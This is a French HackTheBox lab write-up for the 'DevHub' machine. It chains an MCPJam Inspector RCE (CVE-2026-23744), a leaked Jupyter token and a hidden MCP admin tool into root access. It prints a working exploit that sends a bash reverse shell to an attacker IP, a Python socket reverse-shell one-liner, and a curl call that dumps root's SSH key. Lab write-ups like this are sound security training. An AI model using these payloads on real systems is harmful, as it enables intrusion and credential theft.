# DevHub — HTB Writeup

> **Plateforme :** HackTheBox  
> **Difficulté :** Medium  
> **OS :** Linux (Ubuntu 22.04)  
> **IP cible :** `10.129.245.216`  
> **CVE exploitée :** CVE-2026-23744 (MCPJam Inspector RCE)

---

## Sommaire

1. [Reconnaissance](#1-reconnaissance)
2. [Énumération web](#2-énumération-web)
3. [Exploitation — CVE-2026-23744 (RCE MCPJam)](#3-exploitation--cve-2026-23744-rce-mcpjam)
4. [Mouvement latéral — Jupyter Notebook](#4-mouvement-latéral--jupyter-notebook)
5. [Élévation de privilèges — OPSMCP Hidden Tool](#5-élévation-de-privilèges--opsmcp-hidden-tool)
6. [Récapitulatif](#6-récapitulatif)

---

## 1. Reconnaissance

On commence par ajouter l'IP à `/etc/hosts` :

```bash
echo "10.129.245.216 devhub.htb" >> /etc/hosts
```

Puis un scan Nmap complet pour identifier tous les services :

```bash
nmap -sCV -p- --min-rtt-timeout 500ms 10.129.245.216
```

**Résultat :**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
                       |_http-title: DevHub - Internal Development Platform
6274/tcp open  unknown [MCPJam Inspector]
```

Trois ports ouverts :
- **22** — SSH (OpenSSH 8.9p1)
- **80** — HTTP (nginx, "DevHub - Internal Development Platform")
- **6274** — Service HTTP inconnu, retourne une interface HTML `MCPJam Inspector`

---

## 2. Énumération web

En naviguant sur le site principal (`http://devhub.htb`), on tombe directement sur la page d'accueil de DevHub :

![Page d'accueil DevHub](images/01_homepage.png)

L'interface révèle qu'il s'agit d'une plateforme de développement interne. Le port 6274 repéré lors du scan attire l'attention — on s'y connecte directement :

![Interface MCPJam Inspector](images/02_mcpjam.png)

On identifie l'outil : **MCPJam Inspector**, une interface web pour inspecter des serveurs MCP (Model Context Protocol). On cherche la version dans les paramètres (`Settings`) :

![Version MCPJam v1.4.2](images/03_mcpjam_version.png)

```
MCPJam Version: v1.4.2
```

Une recherche sur Exploit-DB révèle une vulnérabilité critique pour cette version :

> **[EDB-52625] MCPJam Inspector ≤ 1.4.2 — Remote Code Execution (CVE-2026-23744)**  
> https://www.exploit-db.com/exploits/52625

---

## 3. Exploitation — CVE-2026-23744 (RCE MCPJam)

### Analyse de la vulnérabilité

La faille réside dans l'endpoint `/api/mcp/connect` qui accepte une configuration de serveur MCP sans validation. L'attaquant peut y injecter une commande arbitraire via le champ `command`.

### Exploit

```python
# CVE-2026-23744 — MCPJam Inspector RCE
# Auteur : Diamorphine | Testé sur : Debian

import asyncio
import httpx
import argparse
from urllib.parse import urljoin

async def main(attacker_ip, attacker_port, url):
    async with httpx.AsyncClient(verify=False) as client:
        data = {
            "serverConfig": {
                "command": "bash",
                "args": ["-c", f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"],
                "env": {}
            },
            "serverId": "Hello666"
        }
        ready_url = urljoin(url, "/api/mcp/connect")
        r = await client.post(url=ready_url, json=data)
        print(r.text)
```

On lance un listener Netcat et on exécute l'exploit :

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit
python3 exploit.py -u http://devhub.htb:6274 -l 10.10.14.196 -p 4444
```

On obtient un shell en tant que `mcp-dev`. On le stabilise immédiatement :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
```

---

## 4. Mouvement latéral — Jupyter Notebook

### Découverte du service Jupyter

En examinant les services systemd, on repère un service Jupyter tournant sous l'utilisateur `analyst` :

```bash
mcp-dev@devhub:/$ systemctl cat jupyter.service
```

```ini
[Service]
User=analyst
Environment=JUPYTER_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --ServerApp.token='a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7'
```

Un token d'authentification est exposé en clair dans la configuration. Le service écoute sur `127.0.0.1:8888` — il faut créer un tunnel SSH pour y accéder.

### Création du tunnel SSH

On génère une paire de clés RSA sur la machine attaquante :

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/devhub_key -N ""
```

On ajoute la clé publique dans le fichier `authorized_keys` de `mcp-dev` sur la cible, puis on établit le tunnel :

```bash
ssh -i ~/.ssh/devhub_key -L 8888:localhost:8888 mcp-dev@devhub.htb
```

### Accès à Jupyter Lab

En naviguant sur `http://localhost:8888`, on arrive sur l'interface de connexion Jupyter :

![Jupyter login avec token](images/05_jupyter_token.png)

On renseigne le token récupéré précédemment et on accède à l'interface complète :

![Dashboard Jupyter Lab](images/04_jupyter.png)

Jupyter Lab offre un terminal intégré, exécuté en tant qu'`analyst`. On rebascule vers un reverse shell classique pour plus de flexibilité :

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.196",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("sh")'
```

On est désormais connecté en tant qu'`analyst`.

### Flag utilisateur

```bash
analyst@devhub:~$ cat user.txt
```

🚩 **user.txt** — récupéré.

---

## 5. Élévation de privilèges — OPSMCP Hidden Tool

### Découverte d'une clé API

En listant le répertoire home de `analyst`, on remarque un fichier inhabituel :

```bash
analyst@devhub:~$ ls -la
```

```
-rw------- 1 analyst analyst   35 Mar 16 21:49 .opsmcp_key
```

```bash
analyst@devhub:~$ cat .opsmcp_key
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

### Analyse du service OPSMCP

En cherchant des processus ou fichiers liés à ce nom, on trouve un serveur Flask dans `/opt/opsmcp/server.py`. Lecture du code source :

```python
# Clé d'API en clair dans le code
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Outil caché non listé dans /tools/list
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}
```

La vérification via `ss` confirme que le service écoute sur `127.0.0.1:5000` :

```bash
analyst@devhub:/opt/opsmcp$ ss -tulnp | grep 5000
tcp   LISTEN  127.0.0.1:5000   0.0.0.0:*
```

### Exploitation — dump de la clé SSH root

L'outil caché `ops._admin_dump` avec le paramètre `target: ssh_keys` permet de lire `/root/.ssh/id_rsa`. On l'appelle directement :

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

La réponse contient la clé privée RSA de root. On la sauvegarde localement :

```bash
# Sur la machine attaquante
nano rootkey
chmod 600 rootkey
```

### Connexion SSH en tant que root

```bash
ssh -i rootkey root@devhub.htb
```

![Connexion root réussie](images/06_root.png)

```
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag root

```bash
root@devhub:~# cat root.txt
```

🚩 **root.txt** — récupéré.

---

## 6. Récapitulatif

### Chaîne d'attaque

```
Nmap → Port 6274 (MCPJam v1.4.2)
  └─► CVE-2026-23744 → RCE → shell mcp-dev
        └─► systemctl → Jupyter token exposé
              └─► Tunnel SSH → Jupyter Lab → shell analyst
                    └─► .opsmcp_key + OPSMCP hidden tool
                          └─► dump /root/.ssh/id_rsa → SSH root
```

### Vulnérabilités identifiées

| Vulnérabilité | Impact | Localisation |
|---|---|---|
| CVE-2026-23744 — MCPJam RCE | Accès initial (`mcp-dev`) | Port 6274 |
| Token Jupyter en clair dans systemd | Mouvement latéral (`analyst`) | `/etc/systemd/system/jupyter.service` |
| Clé API exposée + outil caché OPSMCP | Privilege escalation (`root`) | `/opt/opsmcp/server.py` + `~/.opsmcp_key` |

### Outils utilisés

| Outil | Usage |
|---|---|
| `nmap` | Scan de ports et fingerprinting |
| Exploit-DB / CVE-2026-23744 | RCE sur MCPJam Inspector |
| `ssh -L` | Tunnel SSH vers Jupyter |
| `curl` | Exploitation de l'API OPSMCP |

---

*Writeup réalisé dans un cadre légal et éducatif sur la plateforme HackTheBox.*
